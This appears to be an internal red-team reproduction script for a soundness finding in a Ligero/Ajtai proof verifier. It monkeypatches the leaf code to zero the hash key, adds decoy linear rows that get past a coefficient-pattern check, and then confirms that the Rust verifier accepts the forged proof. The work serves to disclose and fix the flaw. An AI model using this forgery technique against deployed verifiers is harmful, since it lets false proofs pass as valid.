"""red-team-leaf-2 G1: the Rust ``leaf.rs::check_system_key`` (red-team-leaf F6) is a coefficient-pattern scan, so a system
file whose REAL Ajtai chain uses the key ``B = 0`` passes it when it also carries 2n decoy ``Linear`` rows with the derived
key's coefficients over rows that are identically zero.  Every row digest is then 0, the committed trees are trees of
zeros (the root commits to nothing about the operands), and ``ligero-verify verify --allow-any-system`` accepts.

Run against an exported tree of the Ajtai lane (no install; torch CPU, ~10 s):

    PYTHONPATH=<tree>:<tree>/packages/verity/src ~/projects/verity/.venv/bin/python leaf2_ajtai_decoy.py \
        --out /tmp/rt2/out/ajtai-decoy --bin <ligero-verify of the same tree> [--no-decoys]

``--no-decoys`` is the control: the naive B = 0 system, which ``check_system_key`` does refuse.  Exit status 0 iff the
forged fixture was ACCEPTED by the Rust verifier (the finding reproduces) -- or, with ``--no-decoys``, REFUSED."""
from __future__ import annotations

import argparse
import json
import subprocess
from pathlib import Path

import numpy as np


def patch(decoys: bool) -> None:
    import torch

    from archive.direct.ligero.compile import P, Linear
    from archive.direct.ligero.leaf import ajtai as A

    zero_names = [f"decoy.z{i}" for i in range(A.M_COL + 2)]
    rows_of_ctx: dict[int, list[int]] = {}
    orig_init, orig_gadget, orig_cw = A.AjtaiLeaf.__init__, A.AjtaiLeaf.gadget, A.AjtaiLeaf.chain_witness

    def evil_init(self, *a, **k):
        orig_init(self, *a, **k)                       # params_sha256 = the honest scheme's (the statement names it)
        self._B = np.zeros_like(A.derive_matrix(self.n, 2 * self.m_col))      # the key the circuit and committer use

    def evil_gadget(self, ctx, words, *, word_bits, role, row_words, carry_in, first=False, last=True):
        out, carry = orig_gadget(self, ctx, words, word_bits=word_bits, role=role, row_words=row_words,
                                 carry_in=carry_in, first=first, last=last)
        if not decoys:
            return out, carry
        z = rows_of_ctx.get(id(ctx))
        if z is None:
            z = rows_of_ctx[id(ctx)] = [next(iter(ctx.hint(nm).lin)) for nm in zero_names]
        b_true = A.derive_matrix(self.n, 2 * self.m_col)
        off = A.key_offset(role, self.m_col)
        for x in range(self.n):
            lin = {z[i]: (P - int(b_true[x, off + i])) % P for i in range(self.m_col) if int(b_true[x, off + i])}
            lin[z[self.m_col]] = P - 1                 # "acc_in" term
            lin[z[self.m_col + 1]] = 1                 # "out" term
            ctx.sys.linear.append(Linear(f"hash.decoy.r{role}.{x}", lin, 0, None))
        return out, carry

    def evil_cw(self, words, *, word_bits, role, row_words, n_vus, steps, l):
        carry, dg, extras = orig_cw(self, words, word_bits=word_bits, role=role, row_words=row_words, n_vus=n_vus,
                                    steps=steps, l=l)
        if decoys:
            extras = dict(extras)
            extras.update({nm: torch.zeros(l, dtype=torch.int64, device=words.device) for nm in zero_names})
        return carry, dg, extras

    A.AjtaiLeaf.__init__, A.AjtaiLeaf.gadget, A.AjtaiLeaf.chain_witness = evil_init, evil_gadget, evil_cw


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--bin", required=True)
    ap.add_argument("--leaf", default="ajtai-n64")
    ap.add_argument("--relation", default="fp8-ada")
    ap.add_argument("--no-decoys", action="store_true")
    args = ap.parse_args()
    patch(decoys=not args.no_decoys)
    from archive.direct.ligero.leaf.fixtures import write_fixture

    out = Path(args.out)
    man = write_fixture(out, args.relation, args.leaf, n_vus=4, vus=(1, 3), mode="fiat-shamir", device="cpu")
    dig = np.asarray(man["digests"]["a"] + man["digests"]["b"])
    print(f"python accepted the forged fixture: {man['python_verdict']}; every committed digest is 0: {not dig.any()}; "
          f"system rows {man['system']['rows']}")
    res = {}
    for flag in ([], ["--allow-any-system"]):
        r = subprocess.run([args.bin, "verify", "--system", str(out / "system.bin"), "--statement", str(out / "sub_00.stmt"),
                            "--proof", str(out / "sub_00.proof"), *flag], capture_output=True, text=True)
        js = json.loads(r.stdout.strip().splitlines()[-1])
        res[" ".join(flag) or "pinned"] = js
        print(f"rust verify {' '.join(flag) or '(pinned mode)'}: accepted={js['accepted']} system_pinned={js.get('system_pinned')} "
              f"reason={js['reason'][:220]}")
    (out / "redteam_verdicts.json").write_text(json.dumps(res, indent=1))
    forged_accepted = res["--allow-any-system"]["accepted"]
    return 0 if (forged_accepted != args.no_decoys) else 1


if __name__ == "__main__":
    raise SystemExit(main())
